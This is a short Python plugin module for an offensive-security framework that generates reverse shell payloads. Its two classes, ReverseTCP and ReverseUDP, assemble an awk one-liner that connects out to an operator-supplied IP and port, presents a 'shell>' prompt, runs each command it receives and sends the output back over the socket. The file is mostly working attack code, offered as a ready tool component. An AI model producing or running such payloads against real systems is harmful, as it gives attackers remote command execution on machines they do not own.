from ogabog.cores import plugin  # , const


class ReverseTCP(plugin.ReverseShell):
    def __init__(self):
        super().__init__()
        self.shell_type = "tcp"
        self.opts.description = "[ReverseShell][TCP] awk from swisskyrepo/PayloadsAllTheThings. License MIT."
        self.opts.description += "\nModule author: Nguyen Hoang Thanh <smith.nguyenhoangthanh@gmail.com>"

    def make_shell(self):
        self.shell = """awk 'BEGIN {s = \""""
        if self.shell_type == "udp":
            self.shell += f"""/inet/udp/0/{self.args.ip}/{self.args.port}";"""
        else:
            self.shell += f"""/inet/tcp/0/{self.args.ip}/{self.args.port}";"""
        self.shell += """while(42) { do{ printf "shell>" |& s; s |& getline c; """
        self.shell += """if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } """
        self.shell += """while(c != "exit") close(s); }}' /dev/null"""


class ReverseUDP(ReverseTCP):
    def __init__(self):
        super().__init__()
        self.shell_type = "udp"
        self.opts.description = "[ReverseShell][UDP] Generic shells from swisskyrepo/PayloadsAllTheThings. License MIT."
